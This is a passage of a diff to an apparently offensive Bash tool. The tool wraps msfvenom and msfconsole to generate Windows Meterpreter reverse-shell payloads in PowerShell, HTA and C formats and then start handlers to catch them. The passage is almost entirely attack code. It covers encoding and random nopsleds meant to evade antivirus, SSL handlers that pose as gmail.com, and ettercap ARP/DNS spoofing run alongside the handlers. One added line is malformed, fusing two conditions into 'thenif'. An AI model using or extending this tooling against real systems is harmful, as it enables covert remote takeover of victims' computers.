               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -2127,9 +2127,8 @@ if [ -z "$N4m" ]; then N4m="psh-cmd";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 echo "" > $IPATH/output/chars.raw
@@ -2146,10 +2145,10 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
 fi
 
 
@@ -2228,7 +2227,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -2249,7 +2248,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           cd $IPATH/
         else
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -2364,7 +2363,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -2385,7 +2384,7 @@ fi
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -2404,7 +2403,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -2425,7 +2424,7 @@ fi
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -2503,9 +2502,9 @@ cat << !
 
 # use metasploit to build shellcode
 if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
 fi
 
 echo ""
@@ -3313,9 +3312,8 @@ if [ -z "$N4m" ]; then N4m="ReL1K";fi
 
 echo "[☠] Building shellcode -> HTA-PSH format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -3331,10 +3329,10 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f hta-psh > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f hta-psh > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"
 fi
 
 echo ""
@@ -3410,7 +3408,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -3431,7 +3429,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           cd $IPATH/
         else
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -3504,7 +3502,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -3525,7 +3523,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -3544,7 +3542,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -3565,7 +3563,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -3626,9 +3624,8 @@ if [ -z "$N4m" ]; then N4m="Graeber";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -3648,10 +3645,10 @@ cat << !
 # HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
 #
 KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw" > /dev/null 2>&1
 fi
 
 # parsing shellcode data
@@ -3730,7 +3727,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -3751,7 +3748,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           cd $IPATH/
         else
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -3826,7 +3823,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -3847,7 +3844,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -3866,7 +3863,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -3887,7 +3884,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" 
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -3946,9 +3943,8 @@ if [ -z "$N4m" ]; then N4m="ReL1K";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -4030,7 +4026,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4051,7 +4047,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           cd $IPATH/
         else
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
